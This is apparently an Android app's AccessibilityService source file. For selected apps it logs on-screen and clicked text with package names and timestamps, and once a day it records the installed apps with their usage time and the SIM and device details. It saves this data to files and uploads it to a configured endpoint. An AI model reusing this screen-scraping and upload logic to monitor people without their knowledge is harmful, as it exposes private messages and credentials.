package com.example.liveaction_int;

import static android.content.ContentValues.TAG;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StrictMode;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.NonNull;
import androidx.core.accessibilityservice.AccessibilityServiceInfoCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Set;
import java.util.concurrent.Executor;

import javax.net.ssl.HttpsURLConnection;

public class Access_new extends AccessibilityService {
    String s2=""; // for shared pref
    String dir="";  /// for shared pref

    String abt = "";//// for shared pref
    String[] appslist = new String []{}; // Event package Input Api///shared pref

    FileSender fs =new FileSender();
    Filewrite fw = new Filewrite();
    String must_dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath();

    ArrayList<String> appl = new ArrayList<String>();///// for input Api package list

    private ArrayList<String> installedApps; /// array list for inatalld  appltion


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        ///internet connectivity  refrence////

        ConnectivityManager conMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo net = conMgr.getActiveNetworkInfo();

        /////////charging status////

        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = this.registerReceiver(null, ifilter);
        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING;           // charging instance

       ////calender ref //////
        final Calendar c = Calendar.getInstance();
        /////// input of shared pref - userid, dir, api endpoint//////
        SharedPreferences sh = getSharedPreferences("MySharedPref", MODE_PRIVATE);
        s2 = sh.getString("Userid", "");
        dir = sh.getString("dir","");
        abt = sh.getString("endpt", "");


        ////////trigger for usage data file creation /////////
        if (c.get(Calendar.HOUR_OF_DAY)==15 && c.get(Calendar.MINUTE)==30){
            installedApps = getInstalledApps();

            String joinedString = String.join(" ", installedApps);

            TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
            String simOperatorName = telephonyManager.getSimOperatorName();
            String brand  = Build.MANUFACTURER;
            String gt = Build.MODEL;
            String devicedata = "TELCOM\n"+simOperatorName+"PHONE_BRAND\n"+brand+gt+"\n"+joinedString;
            fw.writedata(devicedata,c,dir,s2);
            Log.e("instakll",devicedata);
        }

        AccessibilityNodeInfo source = event.getSource();
        if (event.getEventType()== AccessibilityEvent.TYPE_VIEW_CLICKED){
            String Text = String.valueOf(event.getText());
            String Content_Desc = String.valueOf(event.getContentDescription());
            String str_ty = c.get(Calendar.YEAR) + "-" + String.valueOf(c.get(Calendar.MONTH) + 1) + "-" + c.get(Calendar.DATE) + ":" + c.get(Calendar.HOUR_OF_DAY) + ":" + c.get(Calendar.MINUTE) + ":" + c.get(Calendar.SECOND) + ":" + c.get(Calendar.MILLISECOND);
            String Pack_name = String.valueOf(event.getPackageName());

            String Class_name = String.valueOf(event.getClassName());

            String Event_type = String.valueOf(event.getEventType());
            String Data_str =  "~NewEvent:" + "event_info^" + Pack_name + "*" + Class_name + "*" + Event_type + "^text^" + Text + "^description^" + Content_Desc + "^event_time^" + str_ty;
            Log.e("SINGLE ELEMENT*1 ", Data_str);

            fw.writeFile(Data_str, s2, c, dir);
        }

        if (source != null) {
            AccessibilityNodeInfo rowNode = AccessibilityNodeInfo.obtain(source);
            if(rowNode!= null) {
                /////////////////////
                String Text = String.valueOf(rowNode.getText());
                String Content_Desc = String.valueOf(rowNode.getContentDescription());

                String str_ty = c.get(Calendar.YEAR) + "-" + String.valueOf(c.get(Calendar.MONTH) + 1) + "-" + c.get(Calendar.DATE) + ":" + c.get(Calendar.HOUR_OF_DAY) + ":" + c.get(Calendar.MINUTE) + ":" + c.get(Calendar.SECOND) + ":" + c.get(Calendar.MILLISECOND);

                String Pack_name = String.valueOf(rowNode.getPackageName());

                String Class_name = String.valueOf(rowNode.getClassName());

                String Event_type = String.valueOf(event.getEventType());

                String Data_str = "~NewEvent:" + "event_info^" + Pack_name + "*" + Class_name + "*" + Event_type + "^text^" + Text + "^description^" + Content_Desc + "^event_time^" + str_ty;
                Log.e("SINGLE ELEMENT ", Data_str);
                fw.writeFile(Data_str, s2,c, dir);


                /////////////////////
                int count = rowNode.getChildCount();
                for (int i = 0; i < count; i++) {
                    AccessibilityNodeInfo completeNode = rowNode.getChild(i);
                    recur(completeNode,c,  event);
                }
            }
        }
        fs.sender(abt,must_dir,dir,c,isCharging,net,s2);

    }
    ////Actual Recurtion class to obtain deepest branch/node of parent node///
    private void recur(AccessibilityNodeInfo completeNode,Calendar c,AccessibilityEvent event) {
        if(completeNode!= null){
            int cout =  completeNode.getChildCount();
            try {
                if (cout == 0) {

                    String Text = String.valueOf(completeNode.getText());
                    String Content_Desc = String.valueOf(completeNode.getContentDescription());




                    if((Text!="null")||(Content_Desc!="null")) {
                        String str_ty = c.get(Calendar.YEAR) + "-" + String.valueOf(c.get(Calendar.MONTH) + 1) + "-" + c.get(Calendar.DATE) + ":" + c.get(Calendar.HOUR_OF_DAY) + ":" + c.get(Calendar.MINUTE) + ":" + c.get(Calendar.SECOND) + ":" + c.get(Calendar.MILLISECOND);

                        String Pack_name = String.valueOf(completeNode.getPackageName());

                        String Class_name = String.valueOf(completeNode.getClassName());

                        String Event_type = String.valueOf(event.getEventType());

                        String Data_str = "~NewEvent:" + "event_info^" + Pack_name + "*" + Class_name + "*" + Event_type + "^text^" + Text + "^description^" + Content_Desc + "^event_time^" + str_ty;
                        Log.e("SINGLE ELEMENT ", Data_str);
                         fw.writeFile(Data_str, s2,c, dir);
                        Data_str = "";

                    }
                }
                else {


                    for(int i=0; i<cout ; i++){
                        AccessibilityNodeInfo completeNod = completeNode.getChild(i);
                        recur(completeNod,c,event);
                    }
                }

            }catch(Exception e)
            {
                Log.e("exp",e.getMessage());

            }}

    }






    //////////@Using Usage state class to get Installed packages and their usage///////
    private ArrayList<String> getInstalledApps() {
        PackageManager pm = getPackageManager();
        ArrayList<String> apps = new ArrayList<String>();

        List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);

        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if ((!isSystemPackage(p))) {
                String packages = p.applicationInfo.packageName;
                /////////////////



                UsageStatsManager usageStatsManager = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);


                long currentTime = System.currentTimeMillis();

                List<UsageStats> usageStatsList = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, currentTime - (24 * 60 * 60 * 1000), currentTime);


                String packageName =  p.applicationInfo.packageName;
                long foregroundTime = 0;
                for (UsageStats usageStats : usageStatsList) {
                    if (usageStats.getPackageName().equals(packageName)) {
                        foregroundTime = usageStats.getTotalTimeInForeground();
                        break;
                    }
                }

                long foregroundTimeInMinutes = foregroundTime / 1000 / 60;
                Log.e("tom and jerry","Foreground usage time for " + packageName + " in the last 24 hours: " + foregroundTimeInMinutes + " minutes");

//
                Log.e("packagenme",packages);
                String pack_time= packages+"\n"+foregroundTimeInMinutes+"\n";
                apps.add( pack_time);

            }
        }
        return  apps;
    }

    private boolean isSystemPackage(PackageInfo pkgInfo) {
        return (pkgInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
    }
////////////end of usage class/////


    @Override
    public void onInterrupt() {

    }
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();


        SharedPreferences sharedPreferences = getSharedPreferences("MySharedPref", MODE_PRIVATE);
        Set<String> set = sharedPreferences.getStringSet("APP_LIST", null);
        appl.addAll(set);


        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes=AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED|AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.packageNames = appl.toArray(appslist);
        info.flags= AccessibilityServiceInfoCompat.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 1000;
        this.setServiceInfo(info);


        Log.e(TAG, "onServiceConnected: ");
    }

}
